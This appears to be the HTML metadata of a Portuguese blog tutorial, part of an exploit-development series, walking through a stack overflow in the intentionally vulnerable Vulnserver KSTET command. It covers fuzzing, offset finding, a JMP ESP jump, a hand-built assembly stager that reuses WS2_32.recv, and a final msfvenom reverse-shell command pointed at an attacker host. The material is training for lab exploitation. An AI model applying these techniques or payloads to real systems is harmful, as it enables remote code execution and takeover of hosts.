<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv" /><meta name="author" content="Helvio Junior (m4v3r1ck)" /><meta property="og:locale" content="en_US" /><meta name="description" content="Ola pessoal, Neste post vamos dar continuidade a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim no post anterior (Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter ) fizemos a exploração deste mesmo server com egghunter e neste iremos explorar a reutilização da função WS2_32.recv para reler do nosso socket o shellcode e executa-lo. Antes de dar continuidade eu gostaria de dar os créditos ao autor que me inspirou a criar este post Kevin Kirsche, segue abaixo o link do post original: https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/ O Exploit 0x01 - Fuzzing Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver. Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP. [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. [/sourcecode] Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER [lter_value] KSTAN [lstan_value] EXIT [/sourcecode] Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados. Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0 Total Number of Strings is 681 Fuzzing Fuzzing Variable 0:0 line read=Welcome to Vulnerable Server! Enter HELP for help. Fuzzing Variable 0:1 Variablesize= 5004 Fuzzing Variable 0:2 Variablesize= 5005 Fuzzing Variable 0:3 Variablesize= 21 ^C [/sourcecode] Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug. [sourcecode language=&quot;shell&quot;]Fuzzing Variable 0:1 Variablesize= 5004 [/sourcecode] Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger: Pode-se observar que o spike enviou a requisição conforme abaixo: [sourcecode language=&quot;shell&quot;]KSTET /.:/AAAAAAAAA........ [/sourcecode] Provavelmente 5000 A com o prefixo /.:/ Vamos duplicar este exploit em python criando então uma prova de conceito (PoC) &nbsp; 0x02 - Exploit de PoC Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres /.:/ então vamos reproduzir isso: Executando nosso PoC temos a seguinte saída: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# ./02-poc.py [*] Enviando requisicao maliciosa ... [/sourcecode] E o crash ocorreu: Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre. 0x03 - Determinando o tipo de Exploit e o Offset de controle Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por: [sourcecode language=&quot;shell&quot;]41414141 [/sourcecode] Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como vanilla EIP overwrite. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da metasploit para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu. Gerando o buffer único: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_create -l 5000 [/sourcecode] Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo: Execute este script e veja como ficou o registrador EIP: Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_offset -l 5000 -q 41326341 [*] Exact match at offset 66 [/sourcecode] Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto. 0x04 - Verificando o Offset Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo: E executamos ele obtendo o resultado abaixo: Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs. Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes: Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos. Nota importante: Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros. 0x05 - Saltando para nosso Buffer O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte. [sourcecode language=&quot;shell&quot;]!mona jmp -n -r ESP [/sourcecode] Este comando nos retornou 9 opções Porém a nossa escolha foi a primeira: [sourcecode language=&quot;shell&quot;]Log data, item 11 Address=625011AF Message= 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) [/sourcecode] Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - &#39;\r&#39;, 0x0a - &#39;\n&#39;). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional. Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian. Segue nosso exploit atualizado: Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão Goto address in Dissassembler demonstrado abaixo: E digite o endereço da instrução JMP ESP escolhida: Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint. Agora execute o exploit e veja a aplicação parando no breakpoint selecionado Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status &quot;Breakpoint at essfunc.625011AF&quot; e não outro erro como access violation. Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs 0x06 - Saltando para o buffer maior Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes) Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos. Olhando na imagem anterior vemos o seguinte cenário: [sourcecode language=&quot;shell&quot;]00EDF9F8 43 INC EBX [/sourcecode] Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As? [sourcecode language=&quot;shell&quot;]00EDF9B2 41 INC ECX [/sourcecode] Então podemos fazer alguns cálculos para realizar a movimentação necessária [sourcecode language=&quot;shell&quot;]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70 [/sourcecode] Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX: [sourcecode language=&quot;shell&quot;]PUSH ESP POP EDX [/sourcecode] E posteriormente subtrair 0x46 (decimal 70) de seu valor: [sourcecode language=&quot;shell&quot;]SUB EDX,0x46 [/sourcecode] E por fim saltar para o endereço desejado: [sourcecode language=&quot;shell&quot;]JMP EDX [/sourcecode] Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada msf-nasm_shell conforme demonstrado abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;amp;amp;amp;gt; PUSH ESP 00000000 54 push esp nasm &amp;amp;amp;amp;gt; SUB EDX,0x46 00000000 83EA46 sub edx,byte +0x46 nasm &amp;amp;amp;amp;gt; JMP EDX 00000000 FFE2 jmp edx nasm &amp;amp;amp;amp;gt; [/sourcecode] Segue abaixo o exploit atualizado: Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP) [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;amp;amp;amp;gt; JMP short -72 00000000 EBB6 jmp short 0xffffffb8 nasm &amp;amp;amp;amp;gt; [/sourcecode] Segue abaixo a segunda opção: Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção. Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo: Neste ponto temos pelo menos 2 formar de continuar com o exploit: Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter (este processo é descrito no post Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter ) Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Isso parece meio confuso no início, mas não se preocupe mais a frente explicarei mais detalhadamente este processo. Neste post abordaremos a opção 2: reutilização da função WS2_32.recv. 0x07 - Entendendo a engenharia e utilização da função WS2_32.recv Não existe outra forma melhor de entender o funcionamento deste processo sem entender o que a nossa aplicação está executando, então vamos ao código da aplicação: Analisando o fluxo da aplicação percebemos que a mesma abre um socket na porta especificada, e quando um cliente se conecta é criada uma nova thread que executa a função ConnectionHandler (aproximadamente linha 160) esta é a função responsável por tratar da conexão do cliente. Indo mais a fundo dentro dessa função, depois da conexão estabelecida a aplicação entre em um loop para tratar as requisições vindas do cliente e dentro do loop chama a função recv que é responsável por receber s dados vindos do nosso cliente através do socket. Bom, como a função WS2_32.recv funciona? Se olharmos na documentação do MSDN (localizada aqui) podemos ver o seguinte: [sourcecode language=&quot;c&quot;]int recv( SOCKET s, char *buf, int len, int flags ); [/sourcecode] Sendo assim a função recv recebe 4 parâmetros sendo eles: SOCKET s: file descriptor do socket da conexão do cliente; char *buf: ponteiro de memória do buffer para o qual os dados serão recebidos e copiados; int len: tamanho dos dados a serem recebidos do socket; int flags: as flags influenciam no comportamento da função, para nosso estudo podemos ignorar estes parâmetro. Continuando na análise do nosso código vemos que a função WS2_32.recv (em nosso código) é chamada conforme abaixo: [sourcecode language=&quot;c&quot;]Result = recv(Client, RecvBuf, RecvBufLen, 0); [/sourcecode] O que vamos colocar como foco é o parâmetro RecvBufLen que um pouco antes é definido como: [sourcecode language=&quot;c&quot;]int RecvBufLen = DEFAULT_BUFLEN; [/sourcecode] Que por sua vez a variável estática DEFAULT_BUFLEN fou definida anteriormente como: [sourcecode language=&quot;c&quot;]#define DEFAULT_BUFLEN 4096 [/sourcecode] Isso indica que nossa aplicação realiza a leitura de 4096 bytes. Afe!!!, não entendi nada mas nosso overflow não está ocorrendo com 66 bytes? Da onde vem esse 4096? Vamos continuar a análise que espero explicar isso. Extraindo a sessão de código que trata do nosso comando vulnerável KSTET temos o seguinte código: [sourcecode language=&quot;c&quot;]} else if (strncmp(RecvBuf, &quot;KSTET &quot;, 6) == 0) { char *KstetBuf = malloc(100); strncpy(KstetBuf, RecvBuf, 100); memset(RecvBuf, 0, DEFAULT_BUFLEN); Function2(KstetBuf); SendResult = send( Client, &quot;KSTET SUCCESSFUL\n&quot;, 17, 0 ); } [/sourcecode] Vamos estudar linha a linha: char *KstetBuf = malloc(100): cria a variável KstetBuf e aloca uma espaço de memória de 100 bytes para ela; strncpy(KstetBuf, RecvBuf, 100): copia os 100 primeiros bytes do buffer recebido pelo socket para essa variável recem criada KstetBuf ; memset(RecvBuf, 0, DEFAULT_BUFLEN): preenche todo o buffer (variável RecvBuf) com zeros; Function2(KstetBuf): chama a função Function2 passando como parâmetro a variável KstetBuf que por sua vez detem 100 bytes; Até ai tudo OK, sem nenhuma vulnerabilidade e nhum problema, agora vamos analisar o código da função chamada Function2 conforme abaixo: [sourcecode language=&quot;c&quot;]void Function2(char *Input) { char Buffer2S[60]; strcpy(Buffer2S, Input); } [/sourcecode] Mais uma vez vamos a análise linha a linha: char Buffer2S[60]: cria uma variável com tamanho fixo de 60 bytes; strcpy(Buffer2S, Input): realiza a copia do parâmetro recebido, de nome Input. Nesta sessão podemos perceber a vulnerabilidade no strcpy onde se tenta copiar os 100 bytes passados como parâmetro para dentro de um buffer de 60 bytes. Sendo assim novo overflow consiste em controlar o fluxo da aplicação que ao invés dela continuar seu fluxo normal e executar o código SendResult = send( Client, &quot;KSTET SUCCESSFUL\n&quot;, 17, 0 ) a mesma vai saltar para o endereço que desejamos e controlamos no EIP. Isso explica algumas coisas, o buffer de 66 bytes, pois nunca é o tamanho exato do tamanho da variável que houve o overflow (caso tenha duvida ou não esteja muito familiarizado com este processo sugiro a leitura do post que fiz explicando a teoria do buffer overflow Criação de Exploits – Parte 0 – Um pouco de teoria). Explica também porque temos um buffer tão limitado de 20 bytes após o EIP. Até agora entendemos o porque o overflow ocorre, o porque temos um tamanho tão limitado após o EIP, mas ainda não entramos no como utilizaremos a função recv a nosso favor para receber o nosso shellcode. Como vimos a aplicação em seu fluxo normal executa as seuintes operações: Realiza o bind na porta desejada (por padrão 9999); Quando o cliente se conecta chama a função ConnectionHandler em uma nova thread para tratar das requisições do cliente; Dentro da função ConnectionHandler, fica em um loop infinito chamando a função WS2_32.recv para receber os dados do cliente e trata os dados recebidos conforme os IFs; Em nosso comando vulnerável (KSTET) chama a função de nome Function2; Depois retorna dados para o cliente; O que pretendemos fazer é alterar este fluxo que depois do nosso crash possamos chamar de forma deliberada a função recv lendo um novo buffer de nosso cliente, só que dessa vez sem os limitadores impostos pela aplicação, pois nós que definiremos o tamanho do buffer, e mandando que o recv escreva os novos dados recebidos (que será nosso shellcode) em uma área estratégica para que possamos executa-lo. Basicamente temos a seguinte anatomia após o nosso overflow: 66 bytes: que será nosso segundo estágio 4 bytes: endereço do EIP 20 bytes: stagio1 que fará o JUMP para o segundo estágio Dentro do segundo estágio (66 bytes) nos vamos chamar a função WS2_32.recv para que ela leia do nosso socket mais 520 bytes e o grave no endereço de memória antes do final dos 66 bytes para que após a leitura destes dados possamos executar o nosso shellcode. Vamos dar uma olhada na imagem abaixo logo antes da chamada da função recv Note que a proxima instrução a ser executada é a CALL EAX e que EAX detém o endereço de memória da função WS2_32.recv, e na pilha para a chamada da função tem-se 4 parâmetros conforme abaixo: Socket = 0x50: Nosso file descripto do socket do cliente; Buffer = 0x00E2F9F0: Endereço de memória onde será gravado os dados recebidos pelo socket; BufSize = 0x0208 (Decimal 520): Tamanho do buffer que deve ser lido; Flags = 0: Podemos ignorar. Sendo assim observe que coloquei estratégicamente o endereço onde será gravado os novos dados recebidos para logo depois da minha posição atual de execução, sendo assim após a chamada da função WS2_32.recv continua-se a execução até chegar no shellcode. Agora observer abaixo logo após a chamada da função recv, para efeitos didáticos o shellcode que passei são 520 E que tem hexa 0x45 Do ponto de vista do meu código foi chamado da seguinte forma: [sourcecode language=&quot;python&quot;]#!/usr/bin/python # -*- coding: utf-8 -*- ... ... ... exp.send(buffer) sleep(1) shellcode = &quot;E&quot; * 520 exp.send(shellcode) [/sourcecode] Onde a variável buffer detém todo o código para fazer o buffer overflow e a chamada da função recv (veremos esse código mais a frente) e a variável shellcode são 520 Es &nbsp; 0x08 - Encontrando a função WS2_32.recv Agora que sabemos que iremos usar a função WS2_32.recv precisamos encontra-la em nosso código, o que sabemos é que ela ja foi usada em nossa aplicação, sendo assim ela estará em nossa IAT (Import Address Table) e em algum lugar da nossa aplicação. Para localiza-la reinicie o Immunity Debbuger, anexe a aplicação e no painel superior esquerdo clique com o botão direito do mouse e clique em View &gt; Module &#39;vulnserv&#39;, caso a opção Module &#39;vulnserv&#39; não apareça é porque você ja está neste módulo, se isso for verdade na barra de titulo você verá algo como &#39;module vulnserv&#39;. Agora no painel superior esquerdo clique com o botão direito do mouse e clique em Search for &gt; All intermodular calls Este processo nos mostrara a lista de todas as chamadas para outros módulos. Vamos clicar no cabeçalho na coluna &#39;Destination&#39; para ordenar por nome. É importante notar que a ordenação ocorrerá por nome da função não por módulo. Por exemplo, WS2_32.bind e WS2_32.recv serão ordenadas nas palavras bind e recv respectivamente. Após a ordenação podemos facilmente localizar a chamada para a recv, após localizado a selecione e pressione F2 para adicionar um breakpoint. Você verá que a instrução ficará marcada conforme a a imagem abaixo: Após adicionar o breakkpoint clique com o botão direito e clique em Follow in Disassembler Indo para a chamada da função WS2_32.recv Para localizar o nosso file descritor do socket, vamos alterar nosso exploit substituindo os As do nosso buffer por 0xCC que é um breakpoint. Isso é ara simplificar nosso processo. Quando executado o processo deverá parar no breakpoint do recv Neste ponto podemos observar nossa pilha (stack) os argumentos que estão sendo passados para a função recv. Que fazendo um paralelo com a documentação do MSDN temos os seguintes parâmetros: [sourcecode language=&quot;python&quot;]int recv( SOCKET 0x00000050, char *0x002B3358, int 0x1000, int 0x00000000 ); [/sourcecode] Então nosso file descriptor que tanto desejamos é 0x00000050. Vamos permitir a execução da nossa aplicação pressionando F9 (pode ser que precise reiniciar a aplicação e o immunity e retirar o breakpoint da função recv pois algumas vezes o sistema não permite dar continuidade na execução, se isso ocorrer reinicie o immunity e anexe novamente a aplicação e rode o exploit novamente). Nota de endereço: Neste ponto de pressionarmos mais uma vez o F7 iremos para a tela abaixo onde será apresentado o endereço da chamada da WS2_32.recv em nossa IAT (Import Address Table), anote este endereço pois utilizaremos bem mais a frente. 0x09 - Encontrando o file descriptor Uma vez encontrado o valor do file descriptor agora precisamos encontrar onde o valor do mesmo está armazenado e qual a relação e distância na pilha ele está da nossa posição atual. Com nosso exploit parado no primeiro 0xCC no painel esquero superior clique com o botão direito do mouse e clique em Search for &gt; Binary String Então procure pelo valor do file descriptor (em nosso caso 0x00000050) Quando fazemos isso, podemos buscar as outras opções pressionando CTRL + L. No nosso ambiente encontramos as seguintes opções Escolhi a primeira opção [sourcecode language=&quot;c&quot;]00FAF8B1 0000 ADD BYTE PTR DS:[EAX],AL 00FAF8B3 0050 00 ADD BYTE PTR DS:[EAX],DL 00FAF8B6 0000 ADD BYTE PTR DS:[EAX],AL 00FAF8B8 0000 ADD BYTE PTR DS:[EAX],AL 00FAF8BA 0000 ADD BYTE PTR DS:[EAX],AL [/sourcecode] Quando nós alcançamos a função recv pela primeira vez a pilha de memória estava na posição [sourcecode language=&quot;c&quot;]00FAF9F8 [/sourcecode] Baseado nessas informações podemos calcular a distancia entre a posição atual da pilha e o endereço atual [sourcecode language=&quot;c&quot;]0x00F7F9F8 (Endereço desejado) - 0x00F7F8B1 (ESP) = Hex: 0x0147 ou Decimal: 327 [/sourcecode] Sendo assim vamos começar a escrita do nosso segundo estágio do exploit [sourcecode language=&quot;c&quot;]PUSH ESP ; Armazena a posição atual de ESP na pilha POP ECX ; Retira o valor da pilha e o coloca em ECX SUB CX,0x147 ; Subtrai 0x147 de ECX [/sourcecode] Usando o msf-nasm_shell para nos ajudar nessa tarefa [sourcecode language=&quot;c&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;amp;gt; push esp 00000000 54 push esp nasm &amp;amp;gt; pop ecx 00000000 59 pop ecx nasm &amp;amp;gt; sub cx,0x147 00000000 6681E94701 sub cx,0x147 nasm &amp;amp;gt; [/sourcecode] O exploit ficou assim: Ao executa-lo temos o ECX apontando exatamente para a posição de memória que contém o endereço do file descriptor: Em um mundo perfeito isso estaria certo, mas como logo a frente iremos resgatar este valor usando a chamada PUSH DWORD PTR DS:[ECX], vamos executa-la agora apenas para ver o que acontece. Podemos ver que o valor inserido na pilha foi 0x50000000 e não 0x00000050 como o esperado, isso ocorre devido ao endianess, sendo assim precisamos alterar nosso exploit para subtrair 3 bytes a menos sendo 0x144 ao invés de 0x147, ficando assim: 0x0a - Chamando WS2_32.recv Com nosso file descriptor podemos calcular/montar os outros 3 parametros necessários para a chamada da função WS2_32.recv. Retomando como deve ser a chamada da função, como visto anteriormente, os valores devem ser similares a estes (segund p padrão da documentação do MSDN): [sourcecode language=&quot;c&quot;]int recv( SOCKET 0x00000050, char *0x002B3358, int 0x1000, int 0x00000000 ); [/sourcecode] Conforme visto e certificado na imagem abaixo: Como colocaremos os valores diretamente na pilha devemos lembrar que o empilhamento deve ocorrer de forma inversa (caso tenha dúvidas deste funcionamento veja nosso post Criação de Exploits – Parte 0 – Um pouco de teoria onde explico o funcionamento da pilha e outas coisas mais), sendo assim o primeiro item a ser empilhado é o quarto parâmetro (flags), para posteriormente o tamanho do buffer, a localização da memória a ser utilizada como buffer e por fim o file descriptor (valor este qe ja temos armazenado em ECX) Outro ponto importante que devemos observar é que conforme realizamos um empilhamento, ou seja PUSH, o endereço da pilha vai subtraindo e conforme observado na imagem abaixo o endereço da nossa pilha está localizado ligeiramente abaixo do nosso buffer, isso faz com que cada valor que vamos colocar na pilha reduz mais o nosso restruto espaço de 66 bytes, sendo assim nossa primeira preoocupação antes de colocar os valores na pilha é alterar a posição da pilha para contornar este problema. Então nada que jogar a pilha para 80 bytes a menos não resolva [sourcecode language=&quot;c&quot;]SUB ESP, 0X50 [/sourcecode] Vamos agora tratar o primeiro parametro a ser empilhado (4 argumento da função recv) que é a flag que necessita ter valor 0x00 como 0x00 é um null byte e não podemos usar em nosso exploit vamos usar a técnica do XOR: [sourcecode language=&quot;c&quot;]XOR EAX,EAX ; Zera eax PUSH EAX ; Coloca EAX na pilha [/sourcecode] O segundo valor a ser empilhado (3 argumento da função recv) é o tamanho do buffer, que em nosso caso escolhi 520 (hexa 0x0208) em virtude de uma questão estratégica de não usar o null byte neste processo. Nesta atribuição iremos usar alguns recursos do assembly que nos permite atribuir diretamente algumas partes do nosso registrador, para facilitar o entendimento de uma olhada na imagem abaixo: Representado com os valores que desejamos abaixo: [sourcecode language=&quot;c&quot;]+----------------------+ | | EAX | |32 bits | 00 00 02 08 | +--------|-------------+ | | AX | |16 bits | 02 08 | +--------|-------------+ | | AH AL | |8 bits | 02 08 | +----------------------+ [/sourcecode] Sendo assim podemos atribuir da seguinte forma: [sourcecode language=&quot;c&quot;]XOR EAX,EAX ; Zera eax MOV AL,0x08 ; Coloca 0x08 em AL MOV AH,0x02 ; Coloca 0x02 em AH PUSH EAX ; Coloca EAX na pilha [/sourcecode] Agora vamos para o terceiro valor a ser empilhado (segundo parâmetro da função recv) que é o endereço de memória onde deve-se gravar o que for recebido pelo socket do cliente. Como sabemos que nosso ESP foi deslocado 80 bytes e que antes do deslocamento ele estava ligeiramente abaixo do nosso restrito espaço de 66 bytes vamos usar o mesmo parâmetro de calculo para estimar a posição onde deve ser gravado os dados lidos pelo socket: [sourcecode language=&quot;c&quot;]PUSH ESP ; Armazena a posição atual de ESP na pilha POP EDX ; Retira o valor da pilha e o coloca em EDX ADD EDX, 50 ; Adiciona 80 bytes (hexa 0x50) ao registrador EDX PUSH EDX ; Coloca EDX na pilha [/sourcecode] Por fim vamos colocar na pilha o valor do nosso file descriptor (enteriormente calculado) [sourcecode language=&quot;c&quot;]PUSH DWORD PTR DS:[ECX] ; Coloca na pilha o valor que existe no endereço de memória do ECX [/sourcecode] No final deste processo temos o código abaixo: E ao executa-lo o seguinte resultado: Fazendo nosso paralelo com a documentação MSDN temos os valores abaixo, lembrando que o endereço de memória é dinâmico, então se altera a cada execução [sourcecode language=&quot;c&quot;]int recv( SOCKET 0x00000050, char *0x00FEF9F0, int 0x00000208, int 0x00000000 ); [/sourcecode] Agora temos todos os parâmetros necessários para chamar a função WS2_32.recv, existem diversos métodos para chamar a função, utilizaremos um deles e ao meu ver o mais seguro deles. Mas antes disso precisamos saber qual é o endereço, creio que você se lembre daquele endereço que colocamos o breakpoint e eu falei p/ anotar que usariamos mais a frente? Não? Nessas alturas do campeonato, com tanta coisa eu também não lembraria, nós falamos dele no ítem 0x08, mas para facilitar o trabalho segue ele abaixo: [sourcecode language=&quot;c&quot;]0x0040252c [/sourcecode] Para coloca-lo na pilha vamos adiciona-lo em EAX e depois fazer um CALL EAX, mas ai temos um desafio, o endereço começa com ox00 que é um null byte, então o que fazemos? Sempre temos alguma carta na manga. Neste caso vamos colocar o valor deslocado 8 bits para a esquerda, e depois fazer o deslocamente para a direita. Simples né? Não, então vamos entender, supondo que tenhamos o valor abaixo: [sourcecode language=&quot;c&quot;]+----------------------+ | | EAX | |32 bits | 40 25 2c 11 | +--------|-------------+ [/sourcecode] Ao realizar o deslocamento dele 8 bits para a direita ele passará a ter o seguinte valor: [sourcecode language=&quot;c&quot;]+----------------------+ | | EAX | |32 bits | 00 40 25 2c | +--------|-------------+ [/sourcecode] Que é exatamente o que queremos, e para fazer isso em asembly usamos a instrução shr ficando assim: [sourcecode language=&quot;c&quot;]MOV EAX,0x40252c11 ; Atribui o valor 0x40252c11 em EAX SHR EAX,BYTE 0x8 ; Faz o deslocamento de 8 bits para a direita [/sourcecode] E por fim fazemos o call de EAX [sourcecode language=&quot;c&quot;]CALL EAX [/sourcecode] Antes de executar nosso exploit para o teste necessitamos criar 520 bytes para ser o shellcode bem como fazer o envio dele pelo socket ficando então nosso código como o abaixo: Ao executa-lo temos o seguinte cenário: Antes da chamada do CALL EAX Mais uma vez fazendo o paralelo com a documentação do MSDN temos os seguintes valores: [sourcecode language=&quot;c&quot;]int recv( SOCKET 0x00000050, char *0x00FEF9F0, int 0x00000208, int 0x00000000 ); [/sourcecode] Note que o endereço de memória 00FEF9F0 tem alguns NOPs seguido de outros códigos que logo depois da chamada do CALL EAX são inteiramente substituidos pelo nosso pseudo shellcode (0x45) &nbsp; 0x0b - Aproveite o shell Com tudo pronto basta alterar a variável do shellcode dentro do nosso exploit pelos shellcode desejado e seja feliz [sourcecode language=&quot;shell&quot;]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -b &quot;\x00&quot; -f python [/sourcecode]" /><meta property="og:description" content="Ola pessoal, Neste post vamos dar continuidade a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim no post anterior (Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter ) fizemos a exploração deste mesmo server com egghunter e neste iremos explorar a reutilização da função WS2_32.recv para reler do nosso socket o shellcode e executa-lo. Antes de dar continuidade eu gostaria de dar os créditos ao autor que me inspirou a criar este post Kevin Kirsche, segue abaixo o link do post original: https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/ O Exploit 0x01 - Fuzzing Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver. Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP. [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. [/sourcecode] Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER 